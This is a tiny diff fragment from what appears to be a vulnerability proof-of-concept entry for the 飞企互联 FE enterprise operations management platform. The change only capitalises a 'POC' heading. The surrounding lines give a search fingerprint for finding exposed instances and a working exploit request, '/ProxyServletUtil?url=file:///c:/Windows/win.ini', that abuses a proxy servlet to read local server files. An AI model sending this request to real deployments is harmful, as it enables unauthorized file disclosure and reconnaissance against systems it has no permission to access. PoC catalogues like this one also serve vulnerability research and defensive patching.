@@ -9,7 +9,7 @@
 app="飞企互联-FE企业运营管理平台"
 ```
 
-## poc
+## POC
 ```
 /ProxyServletUtil?url=file:///c:/Windows/win.ini
 ```
